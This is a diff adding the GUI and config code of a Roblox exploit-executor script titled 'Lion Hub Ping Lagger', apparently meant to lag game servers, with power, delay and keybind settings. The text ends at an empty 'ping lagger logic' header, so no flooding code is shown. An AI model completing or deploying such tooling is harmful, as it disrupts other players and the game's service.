@@ -1,0 +1,1621 @@
+-- Lion Ping Lagger + Auto Brainrot
+-- PC + Controller keybind | Customizable | Auto-save | Auto Brainrot Detection
+
+local UserInputService = game:GetService("UserInputService")
+local TweenService     = game:GetService("TweenService")
+local HttpService      = game:GetService("HttpService")
+local Players          = game:GetService("Players")
+local RunService       = game:GetService("RunService")
+
+local plr              = Players.LocalPlayer
+local plrGui           = plr:WaitForChild("PlayerGui")
+
+-- ══════════════════════════════════════════════════════════════════════
+-- CONFIG & SAVE
+-- ══════════════════════════════════════════════════════════════════════
+local CONFIG_FILE = "LionHubPingLagger_Config.json"
+
+local DEFAULT_CFG = {
+    power         = 100000,
+    interval      = 0.125,
+    keybindKb     = "F",
+    keybindGp     = "ButtonR2",
+    autoBrainrot  = true,
+}
+
+local cfg = {
+    power         = DEFAULT_CFG.power,
+    interval      = DEFAULT_CFG.interval,
+    keybindKb     = DEFAULT_CFG.keybindKb,
+    keybindGp     = DEFAULT_CFG.keybindGp,
+    autoBrainrot  = DEFAULT_CFG.autoBrainrot,
+}
+
+local function resolveKb(name)
+    if not name or name == "" or name == "None" then return nil end
+    local ok, val = pcall(function() return Enum.KeyCode[name] end)
+    return (ok and val) or nil
+end
+
+local function saveConfig()
+    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
+    if ok and encoded and writefile then
+        pcall(writefile, CONFIG_FILE, encoded)
+    end
+end
+
+local function loadConfig()
+    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
+    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+    if not ok or type(data) ~= "table" then return end
+
+    cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
+    cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
+    cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
+    cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
+    cfg.autoBrainrot  = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
+end
+
+loadConfig()
+
+local active           = false
+local listeningFor     = nil
+local remote           = nil
+local brainrotMode     = false
+local lastBrainrotState = false
+local manualOverride   = false
+
+-- ══════════════════════════════════════════════════════════════════════
+-- COLOURS - AZUL E VERDE (LION HUB THEME)
+-- ══════════════════════════════════════════════════════════════════════
+local C = {
+    bg      = Color3.fromRGB(0, 6, 12),
+    panel   = Color3.fromRGB(0, 10, 20),
+    card    = Color3.fromRGB(0, 15, 30),
+    blue1   = Color3.fromRGB(0, 100, 255),
+    blue2   = Color3.fromRGB(40, 140, 255),
+    blue3   = Color3.fromRGB(80, 180, 255),
+    green1  = Color3.fromRGB(0, 255, 65),
+    green2  = Color3.fromRGB(60, 255, 120),
+    glow    = Color3.fromRGB(0, 200, 50),
+    white   = Color3.fromRGB(235, 225, 255),
+    dim     = Color3.fromRGB(130, 170, 220),
+    green   = Color3.fromRGB(0, 255, 65),
+    yellow  = Color3.fromRGB(255, 220, 60),
+    red     = Color3.fromRGB(255, 100, 120),
+    waiting = Color3.fromRGB(255, 190, 50),
+    inputBg = Color3.fromRGB(0, 12, 25),
+}
+
+local T = {
+    bg      = 0.35,
+    panel   = 0.30,
+    card    = 0.28,
+    header  = 0.12,
+    inputBg = 0.20,
+}
+
+-- ══════════════════════════════════════════════════════════════════════
+-- DESTROY OLD GUI
+-- ══════════════════════════════════════════════════════════════════════
+for _, kid in pairs(plrGui:GetChildren()) do
+    if kid.Name == "LionHubPingLaggerGui" then kid:Destroy() end
+end
+
+local screen = Instance.new("ScreenGui")
+screen.Name         = "LionHubPingLaggerGui"
+screen.ResetOnSpawn = false
+screen.DisplayOrder = 15
+screen.Parent       = plrGui
+
+-- ══════════════════════════════════════════════════════════════════════
+-- HELPERS
+-- ══════════════════════════════════════════════════════════════════════
+local function applyGradient(parent, c1, c2, rotation)
+    local g = Instance.new("UIGradient", parent)
+    g.Color    = ColorSequence.new({ ColorSequenceKeypoint.new(0,c1), ColorSequenceKeypoint.new(1,c2) })
+    g.Rotation = rotation or 135
+    return g
+end
+
+local function tw(obj, props, t)
+    TweenService:Create(obj,
+        TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        props):Play()
+end
+
+local function makeDraggable(frame)
+    local dragging, dragStart, startPos
+    frame.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1
+        or i.UserInputType == Enum.UserInputType.Touch then
+            dragging  = true
+            dragStart = i.Position
+            startPos  = frame.Position
+            i.Changed:Connect(function()
+                if i.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+    frame.InputChanged:Connect(function(i)
+        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
+                      or i.UserInputType == Enum.UserInputType.Touch) then
+            local d = i.Position - dragStart
+            frame.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + d.X,
+                startPos.Y.Scale, startPos.Y.Offset + d.Y)
+        end
+    end)
+end
+
+local function isGamepad(kc)
+    local n = kc.Name
+    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
+        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
+end
+
+local BLACKLISTED = {
+    [Enum.KeyCode.Escape]      = true,
+    [Enum.KeyCode.LeftControl] = true,
+    [Enum.KeyCode.Unknown]     = true,
+}
+
+-- ══════════════════════════════════════════════════════════════════════
+-- MAIN WINDOW
+-- ══════════════════════════════════════════════════════════════════════
+local MAIN_W, MAIN_H = 220, 88
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name             = "MainFrame"
+mainFrame.Size             = UDim2.new(0, MAIN_W, 0, MAIN_H)
+mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
+mainFrame.BackgroundColor3 = C.bg
+mainFrame.BackgroundTransparency = T.bg
+mainFrame.BorderSizePixel  = 0
+mainFrame.Active           = true
+mainFrame.ClipsDescendants = false
+mainFrame.Parent           = screen
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
+applyGradient(mainFrame, C.bg, Color3.fromRGB(0, 12, 30), 160)
+
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Color        = C.blue1
+mainStroke.Thickness    = 1.5
+mainStroke.Transparency = 0.35
+
+makeDraggable(mainFrame)
+
+-- Header
+local header = Instance.new("Frame", mainFrame)
+header.Size             = UDim2.new(1,0,0,32)
+header.BackgroundColor3 = C.blue1
+header.BackgroundTransparency = T.header
+header.BorderSizePixel  = 0
+header.ZIndex           = 2
+Instance.new("UICorner", header).CornerRadius = UDim.new(0,12)
+applyGradient(header, C.blue1, C.green1, 135)
+
+local headerFill = Instance.new("Frame", mainFrame)
+headerFill.Size             = UDim2.new(1,0,0,8)
+headerFill.Position         = UDim2.new(0,0,0,24)
+headerFill.BackgroundColor3 = C.blue1
+headerFill.BackgroundTransparency = T.header
+headerFill.BorderSizePixel  = 0
+headerFill.ZIndex           = 2
+applyGradient(headerFill, C.blue1, C.green1, 135)
+
+local titleLbl = Instance.new("TextLabel", header)
+titleLbl.Size               = UDim2.new(1,-70,1,0)
+titleLbl.Position           = UDim2.new(0,10,0,0)
+titleLbl.BackgroundTransparency = 1
+titleLbl.Text               = "LION HUB PING LAGGER"
+titleLbl.TextColor3         = C.white
+titleLbl.Font               = Enum.Font.GothamBlack
+titleLbl.TextSize           = 9
+titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
+titleLbl.ZIndex             = 3
+
+-- Status pill
+local statusPill = Instance.new("Frame", header)
+statusPill.Size             = UDim2.new(0,40,0,16)
+statusPill.Position         = UDim2.new(1,-82,0.5,-8)
+statusPill.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
+statusPill.BackgroundTransparency = 0.15
+statusPill.BorderSizePixel  = 0
+statusPill.ZIndex           = 3
+Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1,0)
+
+local statusLbl = Instance.new("TextLabel", statusPill)
+statusLbl.Size              = UDim2.new(1,0,1,0)
+statusLbl.BackgroundTransparency = 1
+statusLbl.Text              = "OFF"
+statusLbl.TextColor3        = C.red
+statusLbl.Font              = Enum.Font.GothamBlack
+statusLbl.TextSize          = 8
+statusLbl.ZIndex            = 4
+
+-- Settings emoji button
+local settingsEmojiBtn = Instance.new("TextButton", header)
+settingsEmojiBtn.Size             = UDim2.new(0,24,0,24)
+settingsEmojiBtn.Position         = UDim2.new(1,-28,0.5,-12)
+settingsEmojiBtn.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
+settingsEmojiBtn.BackgroundTransparency = 0.15
+settingsEmojiBtn.BorderSizePixel  = 0
+settingsEmojiBtn.AutoButtonColor  = false
+settingsEmojiBtn.Text             = "⚙️"
+settingsEmojiBtn.TextColor3       = C.white
+settingsEmojiBtn.Font             = Enum.Font.GothamBlack
+settingsEmojiBtn.TextSize         = 14
+settingsEmojiBtn.ZIndex           = 23
+Instance.new("UICorner", settingsEmojiBtn).CornerRadius = UDim.new(0,6)
+settingsEmojiBtn.MouseEnter:Connect(function() 
+    tw(settingsEmojiBtn,{BackgroundColor3=C.blue1},0.1) 
+end)
+settingsEmojiBtn.MouseLeave:Connect(function() 
+    tw(settingsEmojiBtn,{BackgroundColor3=Color3.fromRGB(0,20,40)},0.1) 
+end)
+
+-- Activate button
+local activateBtn = Instance.new("TextButton", mainFrame)
+activateBtn.Size             = UDim2.new(1,-16,0,30)
+activateBtn.Position         = UDim2.new(0,8,0,40)
+activateBtn.BackgroundColor3 = C.card
+activateBtn.BackgroundTransparency = T.card
+activateBtn.BorderSizePixel  = 0
+activateBtn.AutoButtonColor  = false
+activateBtn.Text             = ""
+activateBtn.ZIndex           = 3
+Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0,8)
+local activateGrad = applyGradient(activateBtn, C.blue1, C.green1, 135)
+
+local activateStroke = Instance.new("UIStroke", activateBtn)
+activateStroke.Color        = C.blue3
+activateStroke.Thickness    = 1.2
+activateStroke.Transparency = 0.4
+
+local activateLbl = Instance.new("TextLabel", activateBtn)
+activateLbl.Size            = UDim2.new(1,0,1,0)
+activateLbl.BackgroundTransparency = 1
+activateLbl.Text            = "ACTIVATE"
+activateLbl.TextColor3      = C.white
+activateLbl.Font            = Enum.Font.GothamBlack
+activateLbl.TextSize        = 11
+activateLbl.ZIndex          = 5
+
+-- ══════════════════════════════════════════════════════════════════════
+-- SETTINGS PANEL
+-- ══════════════════════════════════════════════════════════════════════
+local SET_W, SET_H = 220, 340
+
+local settingsFrame = Instance.new("Frame")
+settingsFrame.Name             = "SettingsPanel"
+settingsFrame.Size             = UDim2.new(0,SET_W,0,SET_H)
+settingsFrame.Position         = UDim2.new(0.5,-SET_W/2,0.5,60)
+settingsFrame.BackgroundColor3 = C.panel
+settingsFrame.BackgroundTransparency = T.panel
+settingsFrame.BorderSizePixel  = 0
+settingsFrame.Active           = true
+settingsFrame.ClipsDescendants = true
+settingsFrame.Visible          = false
+settingsFrame.ZIndex           = 20
+settingsFrame.Parent           = screen
+Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0,12)
+applyGradient(settingsFrame, C.panel, Color3.fromRGB(0, 6, 20), 160)
+
+local setStroke = Instance.new("UIStroke", settingsFrame)
+setStroke.Color        = C.glow
+setStroke.Thickness    = 1.4
+setStroke.Transparency = 0.3
+
+makeDraggable(settingsFrame)
+
+-- Settings header
+local setHeader = Instance.new("Frame", settingsFrame)
+setHeader.Size             = UDim2.new(1,0,0,32)
+setHeader.BackgroundColor3 = C.glow
+setHeader.BackgroundTransparency = T.header
+setHeader.BorderSizePixel  = 0
+setHeader.ZIndex           = 21
+Instance.new("UICorner", setHeader).CornerRadius = UDim.new(0,12)
+applyGradient(setHeader, C.glow, C.blue1, 135)
+
+local setHeaderFill = Instance.new("Frame", settingsFrame)
+setHeaderFill.Size             = UDim2.new(1,0,0,8)
+setHeaderFill.Position         = UDim2.new(0,0,0,24)
+setHeaderFill.BackgroundColor3 = C.glow
+setHeaderFill.BackgroundTransparency = T.header
+setHeaderFill.BorderSizePixel  = 0
+setHeaderFill.ZIndex           = 21
+applyGradient(setHeaderFill, C.glow, C.blue1, 135)
+
+local setTitle = Instance.new("TextLabel", setHeader)
+setTitle.Size               = UDim2.new(1,-80,1,0)
+setTitle.Position           = UDim2.new(0,10,0,0)
+setTitle.BackgroundTransparency = 1
+setTitle.Text               = "Settings"
+setTitle.TextColor3         = C.white
+setTitle.Font               = Enum.Font.GothamBlack
+setTitle.TextSize           = 11
+setTitle.TextXAlignment     = Enum.TextXAlignment.Left
+setTitle.ZIndex             = 22
+
+local setCloseBtn = Instance.new("TextButton", setHeader)
+setCloseBtn.Size             = UDim2.new(0,24,0,24)
+setCloseBtn.Position         = UDim2.new(1,-28,0.5,-12)
+setCloseBtn.BackgroundColor3 = Color3.fromRGB(40,10,60)
+setCloseBtn.BackgroundTransparency = 0.15
+setCloseBtn.BorderSizePixel  = 0
+setCloseBtn.AutoButtonColor  = false
+setCloseBtn.Text             = "X"
+setCloseBtn.TextColor3       = C.white
+setCloseBtn.Font             = Enum.Font.GothamBlack
+setCloseBtn.TextSize         = 11
+setCloseBtn.ZIndex           = 23
+Instance.new("UICorner", setCloseBtn).CornerRadius = UDim.new(0,6)
+setCloseBtn.MouseEnter:Connect(function() tw(setCloseBtn,{BackgroundColor3=C.red},0.1) end)
+setCloseBtn.MouseLeave:Connect(function() tw(setCloseBtn,{BackgroundColor3=Color3.fromRGB(40,10,60)},0.1) end)
+
+-- ── Value input row builder ─────────────────────────────────
+local function mkInputRow(yPos, labelText, getValue, onConfirm)
+    local row = Instance.new("Frame", settingsFrame)
+    row.Size             = UDim2.new(1,-16,0,34)
+    row.Position         = UDim2.new(0,8,0,yPos)
+    row.BackgroundColor3 = C.card
+    row.BackgroundTransparency = T.card
+    row.BorderSizePixel  = 0
+    row.ZIndex           = 21
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
+    local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.6
+
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size               = UDim2.new(0.45,0,1,0)
+    lbl.Position           = UDim2.new(0,10,0,0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text               = labelText
+    lbl.TextColor3         = C.white
+    lbl.Font               = Enum.Font.GothamBold
+    lbl.TextSize           = 10
+    lbl.TextXAlignment     = Enum.TextXAlignment.Left
+    lbl.ZIndex             = 22
+
+    local box = Instance.new("TextBox", row)
+    box.Size               = UDim2.new(0,64,0,24)
+    box.Position           = UDim2.new(1,-72,0.5,-12)
+    box.BackgroundColor3   = C.inputBg
+    box.BackgroundTransparency = T.inputBg
+    box.BorderSizePixel    = 0
+    box.Text               = tostring(getValue())
+    box.TextColor3         = C.green1
+    box.Font               = Enum.Font.GothamBold
+    box.TextSize           = 11
+    box.ClearTextOnFocus   = false
+    box.ZIndex             = 23
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0,6)
+
+    local bs = Instance.new("UIStroke",box); bs.Color=C.glow; bs.Thickness=1; bs.Transparency=0.5
+
+    box.Focused:Connect(function()   tw(bs,{Color=C.blue2,Transparency=0},0.12) end)
+    box.FocusLost:Connect(function()
+        tw(bs,{Color=C.glow,Transparency=0.5},0.12)
+        local n = tonumber(box.Text)
+        if n then
+            onConfirm(n)
+            box.Text = tostring(getValue())
+            saveConfig()
+        else
+            box.Text = tostring(getValue())
+        end
+    end)
+
+    return box
+end
+
+-- ── Keybind row builder ──────────────────────────────────────
+local kbBindBtn, gpBindBtn
+
+local function updateKbLabels()
+    if kbBindBtn then
+        if listeningFor == "kb" then
+            kbBindBtn.Text      = "Press a key..."
+            kbBindBtn.TextColor3 = C.waiting
+        else
+            kbBindBtn.Text      = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
+            kbBindBtn.TextColor3 = C.green1
+        end
+    end
+    if gpBindBtn then
+        if listeningFor == "gp" then
+            gpBindBtn.Text      = "Press a button..."
+            gpBindBtn.TextColor3 = C.waiting
+        else
+            gpBindBtn.Text      = cfg.keybindGp ~= "" and cfg.keybindGp or "None"
+            gpBindBtn.TextColor3 = C.green1
+        end
+    end
+end
+
+local function mkKeybindRow(yPos, labelText, which)
+    local row = Instance.new("Frame", settingsFrame)
+    row.Size             = UDim2.new(1,-16,0,34)
+    row.Position         = UDim2.new(0,8,0,yPos)
+    row.BackgroundColor3 = C.card
+    row.BackgroundTransparency = T.card
+    row.BorderSizePixel  = 0
+    row.ZIndex           = 21
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
+    local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.6
+
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size               = UDim2.new(0.4,0,1,0)
+    lbl.Position           = UDim2.new(0,10,0,0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text               = labelText
+    lbl.TextColor3         = C.white
+    lbl.Font               = Enum.Font.GothamBold
+    lbl.TextSize           = 10
+    lbl.TextXAlignment     = Enum.TextXAlignment.Left
+    lbl.ZIndex             = 22
+
+    local bindBtn = Instance.new("TextButton", row)
+    bindBtn.Size             = UDim2.new(0,72,0,24)
+    bindBtn.Position         = UDim2.new(1,-88,0.5,-12)
+    bindBtn.BackgroundColor3 = C.inputBg
+    bindBtn.BackgroundTransparency = T.inputBg
+    bindBtn.BorderSizePixel  = 0
+    bindBtn.AutoButtonColor  = false
+    bindBtn.Font             = Enum.Font.GothamBold
+    bindBtn.TextSize         = 9
+    bindBtn.TextColor3       = C.green1
+    bindBtn.ZIndex           = 23
+    bindBtn.Text             = which == "kb" and cfg.keybindKb or cfg.keybindGp
+    Instance.new("UICorner", bindBtn).CornerRadius = UDim.new(0,6)
+
+    local bStr = Instance.new("UIStroke",bindBtn); bStr.Color=C.glow; bStr.Thickness=1; bStr.Transparency=0.5
+    bindBtn.MouseEnter:Connect(function() tw(bStr,{Color=C.blue2,Transparency=0},0.1) end)
+    bindBtn.MouseLeave:Connect(function() tw(bStr,{Color=C.glow,Transparency=0.5},0.1) end)
+
+    bindBtn.MouseButton1Click:Connect(function()
+        listeningFor = (listeningFor == which) and nil or which
+        updateKbLabels()
+    end)
+
+    local clearBtn = Instance.new("TextButton", row)
+    clearBtn.Size             = UDim2.new(0,24,0,24)
+    clearBtn.Position         = UDim2.new(1,-28,0.5,-12)
+    clearBtn.BackgroundColor3 = Color3.fromRGB(50,15,30)
+    clearBtn.BackgroundTransparency = T.inputBg
+    clearBtn.BorderSizePixel  = 0
+    clearBtn.AutoButtonColor  = false
+    clearBtn.Text             = "X"
+    clearBtn.TextColor3       = C.red
+    clearBtn.Font             = Enum.Font.GothamBlack
+    clearBtn.TextSize         = 10
+    clearBtn.ZIndex           = 23
+    Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0,6)
+    local cStr = Instance.new("UIStroke",clearBtn); cStr.Color=C.red; cStr.Thickness=1; cStr.Transparency=0.5
+    clearBtn.MouseEnter:Connect(function() tw(cStr,{Transparency=0},0.1) end)
+    clearBtn.MouseLeave:Connect(function() tw(cStr,{Transparency=0.5},0.1) end)
+
+    clearBtn.MouseButton1Click:Connect(function()
+        if listeningFor == which then listeningFor = nil end
+        if which == "kb" then cfg.keybindKb = "None" else cfg.keybindGp = "None" end
+        updateKbLabels()
+        saveConfig()
+    end)
+
+    if which == "kb" then kbBindBtn = bindBtn end
+    if which == "gp" then gpBindBtn = bindBtn end
+
+    return bindBtn
+end
+
+-- ── Auto Brainrot toggle row ────────────────────────────────
+local autoBrainrotBtn
+
+local function createBrainrotRow(yPos)
+    local row = Instance.new("Frame", settingsFrame)
+    row.Size             = UDim2.new(1,-16,0,34)
+    row.Position         = UDim2.new(0,8,0,yPos)
+    row.BackgroundColor3 = C.card
+    row.BackgroundTransparency = T.card
+    row.BorderSizePixel  = 0
+    row.ZIndex           = 21
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
+    local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.6
+
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size               = UDim2.new(0.7,0,1,0)
+    lbl.Position           = UDim2.new(0,10,0,0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text               = "Auto Brainrot"
+    lbl.TextColor3         = C.white
+    lbl.Font               = Enum.Font.GothamBold
+    lbl.TextSize           = 10
+    lbl.TextXAlignment     = Enum.TextXAlignment.Left
+    lbl.ZIndex             = 22
+
+    local toggleBtn = Instance.new("TextButton", row)
+    toggleBtn.Size             = UDim2.new(0,50,0,24)
+    toggleBtn.Position         = UDim2.new(1,-58,0.5,-12)
+    toggleBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)
+    toggleBtn.BorderSizePixel  = 0
+    toggleBtn.AutoButtonColor  = false
+    toggleBtn.Text             = cfg.autoBrainrot and "ON" or "OFF"
+    toggleBtn.TextColor3       = C.white
+    toggleBtn.Font             = Enum.Font.GothamBlack
+    toggleBtn.TextSize         = 9
+    toggleBtn.ZIndex           = 23
+    Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1,0)
+
+    local tStr = Instance.new("UIStroke", toggleBtn)
+    tStr.Color = C.glow; tStr.Thickness = 1; tStr.Transparency = 0.5
+
+    toggleBtn.MouseButton1Click:Connect(function()
+        cfg.autoBrainrot = not cfg.autoBrainrot
+        toggleBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
+        tw(toggleBtn, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)}, 0.15)
+        saveConfig()
+    end)
+
+    autoBrainrotBtn = toggleBtn
+    return toggleBtn
+end
+
+-- Build rows
+local Y = 36
+local GAP = 6
+
+local powerBox = mkInputRow(Y, "Power", function() return cfg.power end, function(v)
+    cfg.power = math.max(1, v)
+end)
+Y = Y + 34 + GAP
+
+local intervalBox = mkInputRow(Y, "Delay (secs)", function() return cfg.interval end, function(v)
+    cfg.interval = math.max(0.01, v)
+end)
+Y = Y + 34 + GAP
+
+createBrainrotRow(Y)
+Y = Y + 34 + GAP
+
+local div = Instance.new("Frame", settingsFrame)
+div.Size             = UDim2.new(1,-16,0,1)
+div.Position         = UDim2.new(0,8,0,Y)
+div.BackgroundColor3 = C.glow
+div.BorderSizePixel  = 0
+div.BackgroundTransparency = 0.5
+div.ZIndex           = 21
+Y = Y + 8
+
+local kbSectLbl = Instance.new("TextLabel", settingsFrame)
+kbSectLbl.Size               = UDim2.new(1,-16,0,16)
+kbSectLbl.Position           = UDim2.new(0,8,0,Y)
+kbSectLbl.BackgroundTransparency = 1
+kbSectLbl.Text               = "KEYBINDS"
+kbSectLbl.TextColor3         = C.dim
+kbSectLbl.Font               = Enum.Font.GothamBold
+kbSectLbl.TextSize           = 8
+kbSectLbl.TextXAlignment     = Enum.TextXAlignment.Left
+kbSectLbl.ZIndex             = 21
+Y = Y + 16
+
+mkKeybindRow(Y, "Keyboard",   "kb"); Y = Y + 34 + GAP
+mkKeybindRow(Y, "Controller", "gp"); Y = Y + 34 + GAP
+
+local resetBtn = Instance.new("TextButton", settingsFrame)
+resetBtn.Size             = UDim2.new(1,-16,0,26)
+resetBtn.Position         = UDim2.new(0,8,0,Y)
+resetBtn.BackgroundColor3 = C.glow
+resetBtn.BorderSizePixel  = 0
+resetBtn.AutoButtonColor  = false
+resetBtn.Text             = "Reset Defaults"
+resetBtn.TextColor3       = C.white
+resetBtn.Font             = Enum.Font.GothamBold
+resetBtn.TextSize         = 10
+resetBtn.ZIndex           = 21
+Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0,7)
+applyGradient(resetBtn, C.glow, C.blue1, 135)
+resetBtn.MouseEnter:Connect(function() tw(resetBtn,{BackgroundColor3=C.blue1},0.1) end)
+resetBtn.MouseLeave:Connect(function() tw(resetBtn,{BackgroundColor3=C.glow},0.1) end)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- RESET CONFIRM DIALOG
+-- ══════════════════════════════════════════════════════════════════════
+local confirmBackdrop = Instance.new("Frame")
+confirmBackdrop.Name                   = "ConfirmBackdrop"
+confirmBackdrop.Size                   = UDim2.new(1,0,1,0)
+confirmBackdrop.BackgroundColor3       = Color3.fromRGB(0,0,0)
+confirmBackdrop.BackgroundTransparency = 0.45
+confirmBackdrop.BorderSizePixel        = 0
+confirmBackdrop.Visible                = false
+confirmBackdrop.ZIndex                 = 50
+confirmBackdrop.Parent                 = screen
+
+local confirmBox = Instance.new("Frame", confirmBackdrop)
+confirmBox.Size             = UDim2.new(0,210,0,120)
+confirmBox.Position         = UDim2.new(0.5,-105,0.5,-60)
+confirmBox.BackgroundColor3 = C.panel
+confirmBox.BackgroundTransparency = T.panel
+confirmBox.BorderSizePixel  = 0
+confirmBox.ZIndex           = 51
+Instance.new("UICorner", confirmBox).CornerRadius = UDim.new(0,10)
+applyGradient(confirmBox, C.panel, Color3.fromRGB(0,6,20), 160)
+
+local cStroke = Instance.new("UIStroke", confirmBox)
+cStroke.Color = C.blue1; cStroke.Thickness = 1.3; cStroke.Transparency = 0.3
+
+local confirmLbl = Instance.new("TextLabel", confirmBox)
+confirmLbl.Size               = UDim2.new(1,-16,0,58)
+confirmLbl.Position           = UDim2.new(0,8,0,8)
+confirmLbl.BackgroundTransparency = 1
+confirmLbl.Text               = "Reset all settings to defaults?"
+confirmLbl.TextWrapped        = true
+confirmLbl.TextColor3         = C.white
+confirmLbl.Font               = Enum.Font.GothamBold
+confirmLbl.TextSize           = 11
+confirmLbl.ZIndex             = 52
+
+local confirmYes = Instance.new("TextButton", confirmBox)
+confirmYes.Size             = UDim2.new(0,92,0,30)
+confirmYes.Position         = UDim2.new(0,8,1,-38)
+confirmYes.BackgroundColor3 = C.glow
+confirmYes.BorderSizePixel  = 0
+confirmYes.AutoButtonColor  = false
+confirmYes.Text             = "Confirm"
+confirmYes.TextColor3       = C.white
+confirmYes.Font             = Enum.Font.GothamBlack
+confirmYes.TextSize         = 11
+confirmYes.ZIndex           = 52
+Instance.new("UICorner", confirmYes).CornerRadius = UDim.new(0,7)
+applyGradient(confirmYes, C.glow, C.blue1, 135)
+
+local confirmNo = Instance.new("TextButton", confirmBox)
+confirmNo.Size             = UDim2.new(0,92,0,30)
+confirmNo.Position         = UDim2.new(1,-100,1,-38)
+confirmNo.BackgroundColor3 = C.card
+confirmNo.BorderSizePixel  = 0
+confirmNo.AutoButtonColor  = false
+confirmNo.Text             = "Cancel"
+confirmNo.TextColor3       = C.dim
+confirmNo.Font             = Enum.Font.GothamBold
+confirmNo.TextSize         = 11
+confirmNo.ZIndex           = 52
+Instance.new("UICorner", confirmNo).CornerRadius = UDim.new(0,7)
+
+confirmYes.MouseEnter:Connect(function() tw(confirmYes,{BackgroundColor3=C.blue1},0.1) end)
+confirmYes.MouseLeave:Connect(function() tw(confirmYes,{BackgroundColor3=C.glow},0.1) end)
+confirmNo.MouseEnter:Connect(function()  tw(confirmNo,{TextColor3=C.white},0.1) end)
+confirmNo.MouseLeave:Connect(function()  tw(confirmNo,{TextColor3=C.dim},0.1) end)
+
+local function hideConfirm() confirmBackdrop.Visible = false end
+
+confirmNo.MouseButton1Click:Connect(hideConfirm)
+
+confirmYes.MouseButton1Click:Connect(function()
+    cfg.power     = DEFAULT_CFG.power
+    cfg.interval  = DEFAULT_CFG.interval
+    cfg.keybindKb = DEFAULT_CFG.keybindKb
+    cfg.keybindGp = DEFAULT_CFG.keybindGp
+    cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot
+    powerBox.Text    = tostring(cfg.power)
+    intervalBox.Text = tostring(cfg.interval)
+    updateKbLabels()
+    if autoBrainrotBtn then
+        autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
+        tw(autoBrainrotBtn, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)}, 0.15)
+    end
+    saveConfig()
+    hideConfirm()
+end)
+
+resetBtn.MouseButton1Click:Connect(function()
+    confirmLbl.Text = "Reset all settings to defaults?"
+    confirmBackdrop.Visible = true
+end)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- SETTINGS OPEN / CLOSE
+-- ══════════════════════════════════════════════════════════════════════
+local settingsOpen = false
+
+local function openSettings()
+    settingsOpen          = true
+    settingsFrame.Visible = true
+    settingsFrame.Size    = UDim2.new(0,SET_W,0,0)
+    tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,SET_H)}, 0.2)
+    tw(settingsEmojiBtn, {BackgroundColor3=C.blue1}, 0.12)
+    powerBox.Text    = tostring(cfg.power)
+    intervalBox.Text = tostring(cfg.interval)
+    updateKbLabels()
+    if autoBrainrotBtn then
+        autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
+        autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)
+    end
+end
+
+local function closeSettings()
+    settingsOpen = false
+    listeningFor = nil
+    updateKbLabels()
+    tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,0)}, 0.16)
+    task.delay(0.18, function() settingsFrame.Visible = false end)
+    tw(settingsEmojiBtn, {BackgroundColor3=Color3.fromRGB(0,20,40)}, 0.12)
+    hideConfirm()
+end
+
+settingsEmojiBtn.MouseButton1Click:Connect(function()
+    if settingsOpen then closeSettings() else openSettings() end
+end)
+setCloseBtn.MouseButton1Click:Connect(closeSettings)
+
+-- ══════════════════════════════════════════════════════════════════════
+-- PING LAGGER LOGIC
+-- ══════════════════════════════════════════════════════════════════════
+
